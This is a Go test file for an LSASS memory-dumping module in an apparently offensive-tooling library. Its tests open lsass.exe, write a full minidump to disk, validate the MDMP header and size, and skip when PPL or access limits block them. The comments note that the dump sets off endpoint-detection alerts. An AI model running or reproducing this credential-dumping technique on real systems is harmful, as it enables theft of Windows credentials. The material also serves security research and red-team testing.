//go:build windows

package lsassdump

import (
	"bytes"
	"encoding/binary"
	"errors"
	"os"
	"path/filepath"
	"testing"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/testutil"
)

func isAdmin() bool {
	return windows.GetCurrentProcessToken().IsElevated()
}

// TestOpenLSASS_RequiresAdmin_UnprotectedHost confirms OpenLSASS can
// locate and open lsass.exe when the current token is admin and lsass
// is not running as a Protected Process Light. The test SKIPs on
// non-admin runs (expected: we return ErrOpenDenied) or when PPL is
// enforced (ErrPPL).
func TestOpenLSASS_RequiresAdmin_UnprotectedHost(t *testing.T) {
	testutil.RequireAdmin(t)

	h, err := OpenLSASS(nil)
	switch {
	case err == nil:
		defer CloseLSASS(h) //nolint:errcheck
		if h == 0 {
			t.Fatal("OpenLSASS returned nil handle without error")
		}
	case errors.Is(err, ErrOpenDenied):
		t.Skipf("lsass refuses VM_READ to our token — acceptable outcome: %v", err)
	case errors.Is(err, ErrPPL):
		t.Skipf("lsass runs as PPL — acceptable outcome: %v", err)
	default:
		t.Fatalf("OpenLSASS: %v", err)
	}
}

// TestDumpToFile_ProducesValidMiniDump dumps lsass to a temp file and
// verifies the output is a well-formed MINIDUMP blob (MDMP signature,
// version 42899, at least one memory region). Gated on admin +
// MALDEV_INTRUSIVE because the full-memory dump triggers loud EDR
// telemetry.
func TestDumpToFile_ProducesValidMiniDump(t *testing.T) {
	testutil.RequireIntrusive(t)
	testutil.RequireAdmin(t)

	out := filepath.Join(t.TempDir(), "lsass.dmp")
	stats, err := DumpToFile(out, nil)
	switch {
	case errors.Is(err, ErrOpenDenied):
		t.Skipf("lsass refuses VM_READ: %v", err)
	case errors.Is(err, ErrPPL):
		t.Skipf("lsass is PPL-protected: %v", err)
	case err != nil:
		t.Fatalf("DumpToFile: %v", err)
	}

	if stats.Regions == 0 {
		t.Fatalf("stats.Regions = 0, expected at least one region")
	}
	if stats.Bytes == 0 {
		t.Fatalf("stats.Bytes = 0, expected non-zero capture")
	}
	if stats.ModuleCount == 0 {
		t.Fatalf("stats.ModuleCount = 0, expected at least lsasrv.dll")
	}
	t.Logf("dumped %d regions / %d bytes / %d modules to %s",
		stats.Regions, stats.Bytes, stats.ModuleCount, out)

	// Validate the header bytes.
	head := make([]byte, 32)
	f, err := os.Open(out)
	if err != nil {
		t.Fatalf("open dump: %v", err)
	}
	defer f.Close()
	if _, err := f.Read(head); err != nil {
		t.Fatalf("read header: %v", err)
	}
	if !bytes.Equal(head[0:4], []byte("MDMP")) {
		t.Fatalf("bad magic: %x (want 'MDMP')", head[0:4])
	}
	if ver := binary.LittleEndian.Uint32(head[4:8]); ver != miniDumpVersion {
		t.Fatalf("bad version: got %d want %d", ver, miniDumpVersion)
	}
	if nStreams := binary.LittleEndian.Uint32(head[8:12]); nStreams != 4 {
		t.Fatalf("bad stream count: got %d want 4", nStreams)
	}

	st, err := os.Stat(out)
	if err != nil {
		t.Fatalf("stat dump: %v", err)
	}
	// lsass on Win10 is typically 50-200MB of committed VM. Anything
	// under 1MB indicates collectRegions bailed early.
	if st.Size() < 1<<20 {
		t.Fatalf("dump suspiciously small: %d bytes", st.Size())
	}
}

// TestDumpToFile_NoAdminIsDenied is the negative case: a non-admin
// run must bounce off OpenLSASS with ErrOpenDenied (never silently
// succeed with a truncated or empty dump).
func TestDumpToFile_NoAdminIsDenied(t *testing.T) {
	if isAdmin() {
		t.Skip("running as admin; negative case requires non-admin token")
	}
	out := filepath.Join(t.TempDir(), "lsass.dmp")
	_, err := DumpToFile(out, nil)
	if err == nil {
		t.Fatal("DumpToFile succeeded without admin — expected ErrOpenDenied")
	}
}
